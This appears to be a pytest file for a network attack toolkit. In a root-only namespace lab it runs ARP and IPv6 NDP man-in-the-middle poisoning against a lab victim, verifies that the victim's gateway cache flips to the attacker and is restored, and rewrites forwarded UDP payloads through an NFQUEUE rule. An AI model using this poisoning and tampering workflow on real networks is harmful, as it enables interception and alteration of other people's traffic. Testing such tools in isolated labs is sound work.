"""Live on-path attack proofs over a real namespaced segment (needs root).

Opt-in: creates real bridges/namespaces, so it runs only as root AND with
REFORGE_LIVE=1. Normal `pytest` skips it.

    sudo REFORGE_LIVE=1 python -m pytest tests/test_live_mitm.py -q

Stands up the segment lab (attacker in the default ns, victim + gateway each in
their own netns) and proves what only a real kernel can: after starting the
MITM, the victim's neighbor cache for the gateway flips to the attacker's MAC
(both ARP for IPv4 and NDP for IPv6), and is restored when the attack stops.
"""

from __future__ import annotations

import os
import time

import pytest

from reforge.testlab.netlab import SegmentLab, is_root, neigh_table, netns_exec

pytestmark = pytest.mark.skipif(
    not (is_root() and os.environ.get("REFORGE_LIVE") == "1"),
    reason="live MITM tests need root and REFORGE_LIVE=1",
)

ATTACKER_IFACE = "rf-atk"


def _attacker_mac() -> str:
    from scapy.all import get_if_hwaddr

    return get_if_hwaddr(ATTACKER_IFACE).lower()


def _gw_mac_in_victim(family: str, gw_ip: str) -> str | None:
    """The MAC the victim currently believes the gateway lives at, or None."""
    for line in neigh_table("rf-victim", family).splitlines():
        parts = line.split()
        if parts and parts[0] == gw_ip and "lladdr" in parts:
            return parts[parts.index("lladdr") + 1].lower()
    return None


def test_arp_mitm_flips_and_restores_victim_cache():
    from reforge.attacks.arp_mitm import ArpMitm

    with SegmentLab() as net:
        atk_mac = _attacker_mac()
        # make the victim resolve the gateway so it has a cache entry to poison
        netns_exec("rf-victim", "ping", "-c", "1", "-W", "1", net["gateway_ip4"],
                   check=False)
        real_gw = _gw_mac_in_victim("-4", net["gateway_ip4"])
        assert real_gw and real_gw != atk_mac, "victim should first see the real gateway MAC"

        mitm = ArpMitm(ATTACKER_IFACE, [net["victim_ip4"]], gateway=net["gateway_ip4"],
                       interval=1.0)
        assert mitm.start(), f"MITM did not start: {mitm.warnings}"
        try:
            flipped = False
            for _ in range(15):
                time.sleep(0.4)
                if _gw_mac_in_victim("-4", net["gateway_ip4"]) == atk_mac:
                    flipped = True
                    break
            assert flipped, "victim's gateway ARP entry never flipped to the attacker"
            st = mitm.status()
            assert st["running"] and net["victim_ip4"] in st["targets"]
        finally:
            mitm.stop()

        # after restore the victim must no longer point the gateway at the attacker
        for _ in range(15):
            time.sleep(0.4)
            if _gw_mac_in_victim("-4", net["gateway_ip4"]) != atk_mac:
                break
        assert _gw_mac_in_victim("-4", net["gateway_ip4"]) != atk_mac, "cache not restored"


def test_ndp_mitm_flips_and_restores_victim_cache():
    from reforge.attacks.ndp_mitm import NdpMitm

    with SegmentLab() as net:
        atk_mac = _attacker_mac()
        netns_exec("rf-victim", "ping", "-6", "-c", "1", "-W", "1", net["gateway_ip6"],
                   check=False)
        real_gw = _gw_mac_in_victim("-6", net["gateway_ip6"])
        assert real_gw and real_gw != atk_mac, "victim should first see the real router MAC"

        mitm = NdpMitm(ATTACKER_IFACE, [net["victim_ip6"]], router=net["gateway_ip6"],
                       interval=1.0)
        assert mitm.start(), f"NDP MITM did not start: {mitm.warnings}"
        try:
            flipped = False
            for _ in range(20):
                time.sleep(0.4)
                if _gw_mac_in_victim("-6", net["gateway_ip6"]) == atk_mac:
                    flipped = True
                    break
            assert flipped, "victim's router NDP entry never flipped to the attacker"
        finally:
            mitm.stop()

        for _ in range(20):
            time.sleep(0.4)
            if _gw_mac_in_victim("-6", net["gateway_ip6"]) != atk_mac:
                break
        assert _gw_mac_in_victim("-6", net["gateway_ip6"]) != atk_mac, "cache not restored"


def test_mitm_plus_nfqueue_rewrites_forwarded_traffic():
    """Flagship inline path: MITM the victim, then rewrite its forwarded
    traffic in the NFQUEUE. The runner must see the victim's packet in the
    kernel FORWARD chain and rewrite its payload."""
    import subprocess
    import threading

    netfilterqueue = pytest.importorskip("netfilterqueue")
    assert netfilterqueue

    from reforge.attacks.arp_mitm import ArpMitm
    from reforge.capture.nfqueue import NfqueueRunner, nft_forward_queue_rules
    from reforge.rules.actions import PayloadReplace
    from reforge.rules.base import Rule
    from reforge.rules.engine import RuleEngine
    from reforge.rules.filter import parse_filter

    queue_num = 33
    with SegmentLab() as net:
        victim, gw = net["victim_ip4"], net["gateway_ip4"]
        mitm = ArpMitm(ATTACKER_IFACE, [victim], gateway=gw, interval=1.0)
        assert mitm.start(), f"MITM did not start: {mitm.warnings}"
        install, remove = nft_forward_queue_rules(queue_num, victims=[victim])
        runner = None
        rt = None
        try:
            assert mitm.status()["forwarding_on"], "IP forwarding must be on to forward"
            for cmd in install:
                subprocess.run(cmd, check=True, capture_output=True)

            # prime the victim's cache, then wait until the poison actually flips
            # it to the attacker — only then does its traffic route through us
            atk_mac = _attacker_mac()
            netns_exec("rf-victim", "ping", "-c", "1", "-W", "1", gw, check=False)
            flipped = False
            for _ in range(15):
                time.sleep(0.4)
                if _gw_mac_in_victim("-4", gw) == atk_mac:
                    flipped = True
                    break
            assert flipped, "victim's ARP never flipped to the attacker"

            engine = RuleEngine([Rule("rw", parse_filter("UDP.dport == 9999"),
                                      [PayloadReplace(b"PING-REQ", b"PONG-REQ")])])
            runner = NfqueueRunner(engine, queue_num=queue_num)
            rt = threading.Thread(target=runner.run, daemon=True)
            rt.start()
            time.sleep(0.6)

            # victim sends a marker UDP toward the gateway; poisoned ARP puts the
            # frame on the attacker, who forwards it -> FORWARD chain -> our queue
            send = ("import socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);"
                    f"s.sendto(b'PING-REQ',('{gw}',9999))")
            for _ in range(12):
                netns_exec("rf-victim", "python3", "-c", send, check=False)
                time.sleep(0.25)
                if runner.stats.modified >= 1:
                    break

            assert runner.stats.seen >= 1, "queue never saw the forwarded packet"
            assert runner.stats.modified >= 1, "payload was not rewritten in the queue"
        finally:
            if runner is not None:
                runner.stop()
            if rt is not None:
                rt.join(timeout=2.0)
            for cmd in remove:
                subprocess.run(cmd, check=False, capture_output=True)
            mitm.stop()
